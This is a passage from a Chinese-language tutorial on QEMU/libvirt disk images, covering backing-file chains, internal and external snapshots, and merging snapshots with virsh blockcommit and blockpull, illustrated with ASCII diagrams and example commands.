<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.-----------.   .-----------.   .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase  |&lt;--- Overlay-1 |&lt;--- Overlay-1A &lt;--- Overlay-1B &lt;--- Overlay-1C |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;-----------&#x27;   &#x27;-----------&#x27;   &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ^    ^</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    &#x27;-------| Overlay-2 |&lt;---| Overlay-2A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            &#x27;-----------&#x27;    &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   &#x27;------------| Overlay-3 |&lt;---| Overlay-3A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &#x27;-----------&#x27;    &#x27;------------&#x27;</span><br></span></code></pre></div></div>
<p>上图表明我们可以只用单个backing file来创建多条链.</p>
<p>注意 : backing file 总是 只读 打开的. 换言之, 一旦新快照被创建，他的后端文件就不能被修改,(快照依赖于后端文件的这种状态).了解更多参见后面的(&#x27;blockcommit&#x27; 节) .</p>
<p>示例 :</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[FedoraBase.img] ----- &lt;- [Fed-guest-1.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-1A]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  \--- &lt;- [Fed-guest-2.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-2A]</span><br></span></code></pre></div></div>
<p>（注意箭头的方向，Fed-w-updates.qcow2 的backing file是 Fed-guest-1.qcow2）</p>
<p>上面的示例中可以看到 FedoraBase.img 安装了一个fedora17系统，并作为我们的backing file.现在这个backing file将作为模板快速的创建两个瘦装备实例，和 Figure-2 道理是一样的.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="具体操作">具体操作<a href="#具体操作" class="hash-link" aria-label="具体操作的直接链接" title="具体操作的直接链接">​</a></h2>
<p>使用qemu-img为单个backing file来创建两个fedora的瘦装备克隆:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-2.qcow2</span><br></span></code></pre></div></div>
<p>现在，上面创建出来的两个镜像 Fedora-guest-1 &amp; Fedora-guest-2 都可以用来启动一个虚拟机，继续我们的示例，现在我们需要创建一个f17的实例，但是这次我们需要创建的是具有完整的更新的实例，这时可以创建另外一个overlay（Fedora-guest-with-updates-1A）而这个overlay的backing file是&#x27;Fed-w-updates.qcow2&#x27;（一个包含了完整更新的镜像）:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/Fed-w-updates.qcow2 -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre></div></div>
<p>我们可以使用qemu-img命令来查看镜像的信息，包 括虚拟磁盘大小，使用大小，backing file指向:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre></div></div>
<p>注意: 最新版本的qemu-img可以递归查询到整条完整的链:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info --backing-chain /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre></div></div>
<p>名词解释Snapshot:</p>
<ul>
<li>内置快照（Internal Snapshots） -- 单个qcow2镜像文件存储了包括数据以及快照的状态信息，</li>
</ul>
<p>内置快照又可以细分一下:-</p>
<ul>
<li>
<p>内置磁盘快照（Internal disk snapshot）:</p>
</li>
<li>
<p>快照点的磁盘状态，数据和快照保存在单个qcow2文件中，虚拟机运行状态和关闭状态都可以创建.</p>
</li>
</ul>
<p>Libvirt 使用 &#x27;qemu-img&#x27; 命令创建关机状态的磁盘快照.Libvirt 使用 &#x27;savevm&#x27; 命令创建运行状态的磁盘快照.</p>
<ul>
<li>内置系统还原点（Internal system checkpoint）:</li>
</ul>
<p>内存状态，设备状态和磁盘状态，可以为运行中的虚拟机创建，所有信息都存储在同一个qcow2文件中，只有在运行状态才能创建内置系统还原点.</p>
<p>Libvirt 使用&#x27;savevm&#x27; 命令来创建这种快照</p>
<ul>
<li>外置快照（External Snapshots） -- 当一个快照被创建时，创建时当前的状态保存在当前使用的磁盘文件中，即成为一个backing file.此时一个新的overlay被创建出来保存往后的数据.</li>
</ul>
<p>这个也可以细分一下:-</p>
<ul>
<li>外置磁盘快照（External disk snapshot）: 磁盘的快照被保存在一个文件中，创建时间点以后的数据被记录到一个新的qcow2文件中.同样可以在运行和关闭状态创建.</li>
</ul>
<p>Libvirt 使用 &#x27;transaction&#x27; 命令来为运行状态创建这种快照.
Libvirt 使用&#x27;qemu-img&#x27; 命令为关闭状态创建这种快照(截止目前功能还在开发中).</p>
<ul>
<li>外置系统还原点（External system checkpoint）:</li>
</ul>
<p>虚拟机的磁盘状态将被保存到一个文件中，内存和设备的状态将被保存到另外一个新的文件中，</p>
<p>（这个功能也还在开发中）.</p>
<p>VM状态（VM state）:</p>
<p>保存运行状态虚拟机的内存设备状态信息至文件，可以通过此文件恢复到保存时的状态，有点类似系统的休眠.（注意创建VM状态保存的时候VM磁盘必须是未发生写入改动的）</p>
<p>Libvirt使用 &#x27;migrate&#x27; (to file)命令来完成VM状态转储.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="创建快照">创建快照<a href="#创建快照" class="hash-link" aria-label="创建快照的直接链接" title="创建快照的直接链接">​</a></h2>
<p>每次产生一个外置snapshot，一个 /new/ overlay 镜像就会随之生成，而前一个镜像就变成了一个快照.</p>
<p>diskonly内置快照创建</p>
<p>假如需要为名为&#x27;f17vm1&#x27;的虚拟机创建一个运行态或关闭态的内置快照snap1</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as f17vm1  snap1 snap1-desc</span><br></span></code></pre></div></div>
<p>列出快照列表，使用<em>qemu-img</em>查看info</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-list f17vm1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /home/kashyap/vmimages/f17vm1.qcow2</span><br></span></code></pre></div></div>
<p>disk-only外置快照创建 :</p>
<p>查看虚拟机磁盘列表</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>创建 外置disk-only磁盘快照（VM<em>运行态</em>）:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as --domain f17-base snap1 snap1-desc \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--disk-only --diskspec vda,snapshot=external,file=/export/vmimages/sn1-of-f17-base.qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--atomic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain snapshot snap1 created</span><br></span></code></pre></div></div>
<ul>
<li>一旦上面的命令被执行，则原来的镜像f17-base将变为backing file，一个新的镜像被创建.</li>
</ul>
<p>现在再列表查看虚拟机磁盘，你会发现新产生的镜像已经投入使用.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/sn1-of-f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>快照回滚</p>
<p>截止写此文之时，回滚至&#x27;内置快照&#x27;(system checkpoint或disk-only)是可以使用的.</p>
<p>虚拟机f17vm1回滚至快照&#x27;snap1&#x27;</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-revert --domain f17vm1 snap1</span><br></span></code></pre></div></div>
<p>使用 snapshot-revert 回滚 &#x27;外置磁盘快照&#x27; 稍微复杂些，需要涉及到稍微复杂点的问题，需要考虑的是合并&#x27;base&#x27;至&#x27;top&#x27;还是合并&#x27;top&#x27;至&#x27;base&#x27;.也就是说，有两种方式可以选择，外置磁盘快照链的缩短可以使用 blockpull 或 blockcommit .截止目前上游社区仍然在努力完善这项功能.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="合并快照文件">合并快照文件<a href="#合并快照文件" class="hash-link" aria-label="合并快照文件的直接链接" title="合并快照文件的直接链接">​</a></h2>
<p>外置快照非常有用，但这里有一个问题就是如何合并快照文件来缩短链的长度，如上所述这里</p>
<p>有两种方式:</p>
<ul>
<li>blockcommit: 从 top 合并数据到 base (即合并overlays至backing files).</li>
<li>blockpull: 将backing file数据合并至overlay中.从 base 到 top .</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockcommit">blockcommit<a href="#blockcommit" class="hash-link" aria-label="blockcommit的直接链接" title="blockcommit的直接链接">​</a></h3>
<p>blockcommit可以让你将&#x27;top&#x27;镜像(在同一条backing file链中)合并至底层的&#x27;base&#x27;镜像.一旦 blockcommit 执行完成，处于最上面的overlay链关系将被指向到底层的overlay或base.这在创建了很长一条链之后用来缩短链长度的时候十分有用.</p>
<p>下面来个图说明下:</p>
<p>我们现在有一个镜像叫&#x27;RootBase&#x27;，拥有4个外置快照，&#x27;Active&#x27;为当前VM写入数据的，</p>
<p>使用&#x27;blockcommit&#x27;可以有以下多种case :</p>
<p>合并Snap-1, Snap-2 and Snap-3 至 &#x27;RootBase&#x27;
只合并Snap-1 and Snap-2 至 RootBase
只合并Snap-1 至 RootBase
合并Snap-2 至 Snap-1
合并Snap-3 至 Snap-2
合并Snap-2 和 Snap-3 至 Snap-1
注: 合并&#x27;Active&#x27;层(最顶部的overlay)至backing_files的功能还在开发中.</p>
<p>(下图解释case (6))</p>
<p>Figure-3</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                 /                  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                /                   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               /  commit data       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                              /                     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                             /                      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            /                       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                           v           commit data  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------. &lt;--------------------&#x27;           .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |                                  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    |&lt;---------------------------------|  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |       Backing File               | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;                                  &#x27;------------&#x27;</span><br></span></code></pre></div></div>
<p>举个例子，有以下场景：</p>
<p>当前: <code>[base] &lt;- sn1 &lt;- sn2 &lt;- sn3 &lt;- sn4(this is active)</code></p>
<p>目标: <code>[base] &lt;- sn1 &lt;- sn4 (如此来丢弃sn2,sn3)</code></p>
<p>下面有两种方式，method-a更快,method-b 慢些，但是sn2有效可用. (VM运行态).</p>
<p>(method-a):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">           # virsh blockcommit --domain f17 vda --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span></code></pre></div></div>
<p>[OR]
(method-b):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn2.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn2.qcow2 --wait --verbose</span><br></span></code></pre></div></div>
<p>注: 如果手工执行<em>qemu-img</em>命令完成的话, 现在还只能用method-b.
Figure-4</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  /                  |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 /                   |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                /                    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   commit data /         commit data |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              /                      |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             /                       | commit data |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            v                        |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.&lt;----------------------|-------------&#x27;            .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;----------------------&#x27;                          |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   |                                                  |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;-------------------------------------------------| (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;                  Backing File                    &#x27;------------&#x27;</span><br></span></code></pre></div></div>
<p>上图演示了case1的blockcommit走向，现在sn4的backing file指向rootbase.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockpull">blockpull<a href="#blockpull" class="hash-link" aria-label="blockpull的直接链接" title="blockpull的直接链接">​</a></h3>
<p>blockpull（qemu中也称作&#x27;block stream&#x27;）可以将backing合并至active，与blockcommit正好相反.截止目前只能将backing file合并至当前使用的active中，也就是说还不支持指定top的合并.
设想一个下面的场景:</p>
<p>Figure-5</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |              \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |               \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                 \ stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 | stream data      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         | stream data     |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                    v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .------------.      |                 &#x27;---------------&gt;  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            |      &#x27;---------------------------------&gt;  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     | RootBase   |                                           |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            | &lt;---------------------------------------- | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     &#x27;------------&#x27;                 Backing File              &#x27;------------&#x27;</span><br></span></code></pre></div></div>
<p>使用blockpull我们可以将snap-1/2/3中的数据合并至active层，最终rootbase将变成active的直接后端.</p>
<p>命令如下:</p>
<p>假设快照已经使用 创建Snapshots 小节中的方式完成:</p>
<p>如<em>Figure-5</em>中描述的-- <code>[RootBase] &lt;- [Active]</code>.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockpull --domain RootBase  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --path /var/lib/libvirt/images/active.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --base /var/lib/libvirt/images/RootBase.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --wait --verbose</span><br></span></code></pre></div></div>
<p>后续的工作是我们需要使用virsh来清理掉不用的快照</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-2 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-1 --metadata</span><br></span></code></pre></div></div>
<p>Figure-6</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                    \  stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              | stream data         \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  | stream data  |                       \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |  stream data     |              &#x27;------------------&gt;     v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |                                    .--------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  &#x27;---------------------------------&gt;  |              |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                                                       |  Snap-4      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &#x27;----------------------------------------------------&gt;  | (Active)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                              &#x27;--------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                &#x27;Standalone&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                (w/o backing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                file)</span><br></span></code></pre></div></div>
<p>上图表示的是将所有backing file全部合并至active</p>
<p>如下执行命令:</p>
<p>(1) 在我们执行合并 <em>之前</em> 查看一下快照的大小(注意观察&#x27;Active&#x27;):
::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        608M -rw-r--r--. 1 qemu qemu 1.0G Oct 11 17:54 /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        